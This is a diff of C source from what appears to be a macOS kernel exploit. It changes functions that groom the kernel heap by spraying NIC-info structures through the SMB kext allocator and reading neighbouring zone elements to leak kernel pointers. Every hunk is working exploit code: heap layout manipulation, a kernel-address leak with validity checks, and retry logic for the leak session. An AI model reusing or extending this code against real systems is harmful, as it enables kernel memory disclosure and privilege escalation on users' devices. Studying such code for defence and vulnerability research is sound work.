@@ -50,24 +50,19 @@ int kmem_zkext_free_kext_leak_nic(smb_nic_allocator allocator, kmem_zkext_neigho
     smb_nic_allocator gap_allocator = smb_nic_allocator_create(addr, sizeof(*addr));
     
     int num_gaps = XE_PAGE_SIZE / 96 * 4;
-    int num_elements_before_gap = 1;
     
     for (int gap_idx = 0; gap_idx < num_gaps; gap_idx++) {
-        struct network_nic_info elements[num_elements_before_gap];
-        bzero(elements, sizeof(elements));
+        struct network_nic_info element;
+        bzero(&element, sizeof(element));
+        element.nic_index = gap_idx;
+        element.addr_4.sin_len = sizeof(struct sockaddr_in);
+        element.addr_4.sin_family = AF_INET;
+        element.addr_4.sin_addr.s_addr = element.nic_index;
+        element.addr_4.sin_port = htons(1234);
+        element.nic_link_speed = (num_gaps - element.nic_index);
+        element.next_offset = sizeof(element);
         
-        for (int element_idx = 0; element_idx < num_elements_before_gap; element_idx++) {
-            struct network_nic_info* info = &elements[element_idx];
-            info->nic_index = (gap_idx * num_elements_before_gap + element_idx);
-            info->addr_4.sin_len = sizeof(struct sockaddr_in);
-            info->addr_4.sin_family = AF_INET;
-            info->addr_4.sin_addr.s_addr = info->nic_index;
-            info->addr_4.sin_port = htons(1234);
-            info->nic_link_speed = ((num_gaps * num_elements_before_gap) - info->nic_index);
-            info->next_offset = sizeof(*info);
-        }
-        
-        int error = smb_nic_allocator_allocate(allocator, elements, num_elements_before_gap, (uint32_t)sizeof(elements));
+        int error = smb_nic_allocator_allocate(allocator, &element, 1, (uint32_t)sizeof(element));
         xe_assert_err(error);
         
         struct network_nic_info gap;
@@ -92,7 +87,7 @@ int kmem_zkext_free_kext_leak_nic(smb_nic_allocator allocator, kmem_zkext_neigho
     }
         
     struct complete_nic_info_entry* entry = (struct complete_nic_info_entry*)data;
-    if (entry->nic_index > num_gaps * num_elements_before_gap || entry->next.prev == 0) {
+    if (entry->nic_index > num_gaps || entry->next.prev == 0 || !xe_vm_kernel_address_valid((uintptr_t)entry->addr_list.tqh_last)) {
         return EIO;
     }
     
@@ -105,7 +100,7 @@ void kmem_zkext_free_kext_allocate_sockets(smb_nic_allocator allocator, int nic_
     size_t done = 0;
     size_t max_batch_size = 1024;
     while (done < count) {
-        size_t batch_size = XE_MIN(max_batch_size, count - done);
+        size_t batch_size = xe_min(max_batch_size, count - done);
         struct network_nic_info infos[batch_size];
         bzero(infos, sizeof(infos));
         for (int sock_idx = 0; sock_idx < batch_size; sock_idx++) {
@@ -129,7 +124,7 @@ void kmem_zkext_free_kext_reserve_nics(smb_nic_allocator allocator, size_t count
     size_t done = 0;
     size_t max_batch_size = 1024;
     while (done < count) {
-        size_t batch_size = XE_MIN(max_batch_size, count - done);
+        size_t batch_size = xe_min(max_batch_size, count - done);
         struct network_nic_info infos[batch_size];
         bzero(infos, sizeof(infos));
         for (int i = 0; i < batch_size; i++) {
@@ -173,9 +168,9 @@ struct complete_nic_info_entry kmem_zkext_free_session_prepare(kmem_zkext_free_s
         } else {
             break;
         }
-    } while (tries--);
+    } while (--tries);
     
-    xe_assert(tries >= 0);
+    xe_assert(tries > 0);
     xe_assert(entry.next.prev != 0);
     
     kmem_zkext_neighbor_reader_destroy(&reader);
